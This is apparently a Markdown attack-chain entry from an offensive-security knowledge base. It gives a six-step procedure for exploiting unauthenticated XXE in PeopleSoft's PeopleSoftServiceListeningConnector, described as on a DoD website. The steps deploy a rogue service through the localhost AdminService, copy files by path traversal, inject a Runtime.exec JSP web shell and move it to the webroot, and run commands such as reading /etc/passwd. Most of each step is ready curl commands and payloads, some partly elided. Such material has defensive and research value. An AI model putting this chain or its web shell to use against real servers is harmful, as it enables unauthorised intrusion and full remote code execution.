---
tags:
  - xxe
  - rce
  - peoplesoft
  - java
  - soap
  - web-shell
type: attack_chain
tools:
  - '[[tools/curl]]'
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands:
  - '[[commands/cat-xxe-payload-file]]'
  - '[[commands/curl-post-xxe-test]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Confirm-XXE-Vulnerability-in-PeopleSoft]]'
  - '[[procedures/Deploy-Malicious-Service-via-XXE]]'
  - '[[procedures/Copy-XML-to-Temp-Directory-via-XXE]]'
  - '[[procedures/Inject-JSP-Shell-Payload]]'
  - '[[procedures/Copy-JSP-to-Webroot]]'
  - '[[procedures/Access-JSP-Shell-for-RCE]]'
step_count: 6
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Unix Shell]]'
  - '[[Web Shell]]'
updated_at: '2025-12-14T17:24:08.015Z'
description: >-
  Multi-stage attack exploiting XXE in a PeopleSoft web application to achieve
  remote code execution through service deployment, file manipulation, and JSP
  shell injection.
skill_level: intermediate
impact_level: high
id: 63128ef1-76ce-4d07-8bbb-c5e77aef9a12
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Unix Shell]]'
  - '[[Web Shell]]'
---
# XXE in PeopleSoftServiceListeningConnector Leading to RCE via Service Deployment and JSP Injection

Multi-stage attack chain demonstrating exploitation of an XML External Entity (XXE) vulnerability in the PeopleSoftServiceListeningConnector endpoint of a DoD website, chained to achieve full remote code execution (RCE) through service deployment, file copying, and JSP shell injection. The attack begins with confirming the XXE flaw, escalates by deploying a malicious service, manipulates files to inject a JSP web shell, and culminates in executing arbitrary system commands on the server.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 6 |
| Execution Time | ~15 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Confirm XXE] --> B[Deploy Service]
    B --> C[Copy XML to Temp]
    C --> D[Inject JSP Shell]
    D --> E[Copy JSP to Webroot]
    E --> F[Execute RCE]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#f39c12
    style D fill:#3498db
    style E fill:#3498db
    style F fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/curl]]
- [[tools/Burp-Suite]]

### Target Environment

- PeopleSoft web application on Java stack (Apache Axis, Pluto, JSP, SOAP)
- Services: PeopleSoftServiceListeningConnector, Integration Broker, AdminService
- Ports: 8080 (internal), standard HTTPS
- Linux-based server (evidenced by /etc/passwd access)

### Initial Access Requirements

- Network access to the public-facing /PSIGW/PeopleSoftServiceListeningConnector endpoint
- No credentials required (unauthenticated XXE)
- Ability to send crafted XML POST requests

## Detailed Attack Procedures

### Step 1: Confirm XXE Vulnerability
procedure: [[procedures/Confirm-XXE-Vulnerability-in-PeopleSoft]]

**Objective**: Verify the XML parser processes external entities without restrictions, confirming file system access.

**Instructions**: Create a test payload file and send it via POST to the endpoint using [[commands/curl-post-xxe-test]]:

```bash
cat foo  # First, view the payload
curl -k -X POST -d @foo https://target/PSIGW/PeopleSoftServiceListeningConnector
```

**Expected Output**: SOAP fault response, but entity resolution (e.g., 'HELLO_XXE' in response or error) indicates XXE is active.

**Success Indicators**:
- Response shows entity expansion or file read attempt
- No strict XML validation errors blocking external entities

### Step 2: Deploy Malicious Service
procedure: [[procedures/Deploy-Malicious-Service-via-XXE]]

**Objective**: Use XXE to reference and execute localhost AdminService for deploying a custom service.

**Instructions**: Craft an XXE payload in the POST body to load the Deploy class and deploy a service named 'lmJyaVBUrfcEfJw' via http://localhost:8080/pspc/services/AdminService.

```bash
curl -k -X POST -H "Content-Type: text/xml" https://target/PSIGW/PeopleSoftServiceListeningConnector -d '<?xml version="1.0"?><!DOCTYPE a [<!ENTITY xxe SYSTEM "http://localhost:8080/pspc/services/AdminService?method=!--><ns1:deployment...">]><a>&xxe;</a>'
```

**Expected Output**: Successful deployment confirmation in response; new service endpoint /pspc/services/lmJyaVBUrfcEfJw becomes available.

**Success Indicators**:
- Service deployed without authentication
- Endpoint responds to SOAP calls

### Step 3: Copy XML to Temp Directory
procedure: [[procedures/Copy-XML-to-Temp-Directory-via-XXE]]

**Objective**: Use the deployed service to copy the portletentityregistry.xml to a writable temp directory for manipulation.

**Instructions**: Send SOAP envelope to the new service calling api:copy with XXE-enabled paths.

```bash
curl -k -X POST -H "Content-Type: text/xml" https://target/pspc/services/lmJyaVBUrfcEfJw -d '<soap:Envelope...><api:copy from="./applications/peoplesoft/pspc.war/WEB-INF/data/portletentityregistry.xml" to="../../../../../../../../../../../../../../../../tmp/QAusGyxGqQqyVEhqzPbu/WEB-INF/data/portletentityregistry.xml"/></soap:Envelope>'
```

**Expected Output**: Copy operation succeeds; file appears in /tmp/QAusGyxGqQqyVEhqzPbu/.

**Success Indicators**:
- File copied to temp location
- No permission errors

### Step 4: Inject JSP Shell Payload
procedure: [[procedures/Inject-JSP-Shell-Payload]]

**Objective**: Modify the temp XML file to include a JSP web shell payload using the service's api:main.

**Instructions**: POST SOAP with parameters including CDATA-wrapped JSP code for command execution.

```bash
curl -k -X POST -H "Content-Type: text/xml" https://target/pspc/services/lmJyaVBUrfcEfJw -d '<soap:Envelope...><api:main><param><![CDATA[<%@ page import="java.util.*,java.io.*"%><% if (request.getParameter("c") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("c")); ... }%>]></param></api:main></soap:Envelope>'
```

**Expected Output**: JSP code injected into the XML file in temp dir.

**Success Indicators**:
- Payload written successfully
- File contents verifiable via further XXE reads if needed

### Step 5: Copy JSP to Webroot
procedure: [[procedures/Copy-JSP-to-Webroot]]

**Objective**: Copy the injected JSP from temp to the web-accessible PSIGW.war directory.

**Instructions**: Use api:copy again to move the file to ./applications/peoplesoft/PSIGW.war/PVrIiSDNAQlOQubhYHDE.jsp.

```bash
curl -k -X POST -H "Content-Type: text/xml" https://target/pspc/services/lmJyaVBUrfcEfJw -d '<soap:Envelope...><api:copy from="../../../../../../../../../../../../../../../../tmp/QAusGyxGqQqyVEhqzPbu/WEB-INF/data/portletentityregistry.xml" to="./applications/peoplesoft/PSIGW.war/PVrIiSDNAQlOQubhYHDE.jsp"/></soap:Envelope>'
```

**Expected Output**: JSP file deployed to webroot.

**Success Indicators**:
- File accessible via HTTP GET
- No deployment errors

### Step 6: Access JSP Shell for RCE
procedure: [[procedures/Access-JSP-Shell-for-RCE]]

**Objective**: Trigger the JSP shell to execute arbitrary commands, demonstrating RCE.

**Instructions**: Use a browser or curl to GET the JSP with ?c= command parameter.

```bash
curl -k "https://target/PSIGW/PVrIiSDNAQlOQubhYHDE.jsp?c=cat%20/etc/passwd"
```

**Expected Output**: Output of /etc/passwd or executed command results.

**Success Indicators**:
- Command output returned in response
- Arbitrary command execution confirmed

## Attack Chain Summary

### Key Achievements

1. Confirmed XXE for local resource access
2. Deployed unauthorized service via localhost SSRF-like XXE
3. Injected and deployed persistent JSP web shell
4. Achieved full RCE on the server

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Unix Shell]]
- [[Web Shell]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]

---

*Last updated: 2023-10-01T00:00:00Z*
